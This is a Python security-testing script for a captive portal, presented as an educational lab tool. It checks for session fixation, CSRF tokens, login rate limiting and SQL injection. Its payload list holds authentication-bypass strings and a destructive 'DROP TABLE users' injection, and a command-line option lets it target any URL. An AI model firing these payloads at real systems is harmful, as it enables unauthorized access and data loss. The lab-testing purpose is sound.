
"""
516 Hackers - Attack Simulation Tool
Captive Portal Security Testing Script
"""

import requests
import json
import time
import random
import hashlib
from urllib.parse import urljoin

class PortalAttackSimulator:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.results = []
        
    def print_banner(self):
        banner = """
        ╔══════════════════════════════════════════════╗
        ║          516 HACKERS ATTACK SIMULATOR        ║
        ║         Captive Portal Security Tests        ║
        ║                                              ║
        ║        FOR EDUCATIONAL PURPOSES ONLY         ║
        ╚══════════════════════════════════════════════╝
        """
        print(banner)
    
    def test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        print("\n[TEST] Session Fixation Vulnerability")
        
        # Set a specific session ID
        fixed_session_id = "FIXED_SESSION_516"
        self.session.cookies.set('session', fixed_session_id)
        
        try:
            # Try to login with fixed session
            login_data = {
                'username': 'guest',
                'password': 'guest123'
            }
            
            response = self.session.post(
                urljoin(self.base_url, '/login'),
                data=login_data,
                allow_redirects=False
            )
            
            # Check if session ID remained the same
            if 'session' in self.session.cookies:
                current_session = self.session.cookies['session']
                if current_session == fixed_session_id:
                    self.results.append({
                        'test': 'Session Fixation',
                        'status': 'VULNERABLE',
                        'details': 'Session ID did not change after login'
                    })
                else:
                    self.results.append({
                        'test': 'Session Fixation', 
                        'status': 'SECURE',
                        'details': 'Session ID changed after login'
                    })
                    
        except Exception as e:
            self.results.append({
                'test': 'Session Fixation',
                'status': 'ERROR',
                'details': str(e)
            })
    
    def test_csrf_vulnerability(self):
        """Test for CSRF protection"""
        print("\n[TEST] CSRF Protection")
        
        try:
            # Get login page and check for CSRF token
            response = self.session.get(urljoin(self.base_url, '/login'))
            content = response.text
            
            if 'csrf_token' in content or '_csrf' in content:
                self.results.append({
                    'test': 'CSRF Protection',
                    'status': 'SECURE', 
                    'details': 'CSRF token found in form'
                })
            else:
                self.results.append({
                    'test': 'CSRF Protection',
                    'status': 'VULNERABLE',
                    'details': 'No CSRF protection detected'
                })
                
        except Exception as e:
            self.results.append({
                'test': 'CSRF Protection',
                'status': 'ERROR',
                'details': str(e)
            })
    
    def test_rate_limiting(self):
        """Test for rate limiting on login"""
        print("\n[TEST] Rate Limiting")
        
        try:
            failed_attempts = 0
            
            for i in range(15):  # Try 15 rapid login attempts
                login_data = {
                    'username': f'attack_user_{i}',
                    'password': 'wrong_password'
                }
                
                response = self.session.post(
                    urljoin(self.base_url, '/login'),
                    data=login_data,
                    allow_redirects=False
                )
                
                if response.status_code == 429:  # Too Many Requests
                    failed_attempts = i
                    break
                    
                time.sleep(0.1)  # Small delay between requests
            
            if failed_attempts > 0:
                self.results.append({
                    'test': 'Rate Limiting',
                    'status': 'SECURE',
                    'details': f'Rate limiting triggered after {failed_attempts} attempts'
                })
            else:
                self.results.append({
                    'test': 'Rate Limiting', 
                    'status': 'VULNERABLE',
                    'details': 'No rate limiting detected'
                })
                
        except Exception as e:
            self.results.append({
                'test': 'Rate Limiting',
                'status': 'ERROR', 
                'details': str(e)
            })
    
    def test_sql_injection(self):
        """Test for basic SQL injection vulnerabilities"""
        print("\n[TEST] SQL Injection")
        
        payloads = [
            "admin' OR '1'='1",
            "' OR 1=1-- -", 
            "'; DROP TABLE users-- -"
        ]
        
        vulnerable = False
        
        for payload in payloads:
            try:
                login_data = {
                    'username': payload,
                    'password': 'any_password'
                }
                
                response = self.session.post(
                    urljoin(self.base_url, '/login'),
                    data=login_data,
                    allow_redirects=False
                )
                
                # Check if we got redirected (successful login)
                if response.status_code == 302:
                    vulnerable = True
                    break
                    
            except Exception:
                continue
        
        if vulnerable:
            self.results.append({
                'test': 'SQL Injection',
                'status': 'VULNERABLE',
                'details': 'SQL injection payload successful'
            })
        else:
            self.results.append({
                'test': 'SQL Injection',
                'status': 'SECURE',
                'details': 'SQL injection attempts blocked'
            })
    
    def run_all_tests(self):
        """Run all security tests"""
        self.print_banner()
        
        print("🚀 Starting 516 Hackers Security Tests...")
        print(f"🔗 Target: {self.base_url}")
        print("")
        
        tests = [
            self.test_session_fixation,
            self.test_csrf_vulnerability, 
            self.test_rate_limiting,
            self.test_sql_injection
        ]
        
        for test in tests:
            test()
            time.sleep(1)  # Be nice to the server
        
        self.print_results()
    
    def print_results(self):
        """Print test results"""
        print("\n" + "="*60)
        print("📊 516 HACKERS SECURITY TEST RESULTS")
        print("="*60)
        
        for result in self.results:
            status_icon = "✅" if result['status'] == 'SECURE' else "❌" if result['status'] == 'VULNERABLE' else "⚠️"
            print(f"{status_icon} {result['test']}: {result['status']}")
            print(f"   📝 {result['details']}")
            print()
        
        # Summary
        vulnerable_count = len([r for r in self.results if r['status'] == 'VULNERABLE'])
        secure_count = len([r for r in self.results if r['status'] == 'SECURE'])
        
        print(f"📈 SUMMARY: {secure_count} secure, {vulnerable_count} vulnerable")
        
        if vulnerable_count > 0:
            print("\n⚠️  SECURITY WARNING: Vulnerabilities detected!")
            print("💡 These are INTENTIONAL for educational purposes")
        else:
            print("\n🎉 All tests passed! (In a real lab, expect some vulnerabilities)")
        
        print("\n🔒 Remember: This is a training environment")
        print("📚 Use findings to learn about security improvements")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='516 Hackers Attack Simulator')
    parser.add_argument('--url', default='http://localhost:5000', help='Portal URL')
    parser.add_argument('--test', choices=['all', 'session', 'csrf', 'rate', 'sql'], 
                       default='all', help='Specific test to run')
    
    args = parser.parse_args()
    
    simulator = PortalAttackSimulator(args.url)
    
    if args.test == 'all':
        simulator.run_all_tests()
    else:
        # Run specific test
        test_map = {
            'session': simulator.test_session_fixation,
            'csrf': simulator.test_csrf_vulnerability,
            'rate': simulator.test_rate_limiting, 
            'sql': simulator.test_sql_injection
        }
        
        simulator.print_banner()
        test_map[args.test]()
        simulator.print_results()
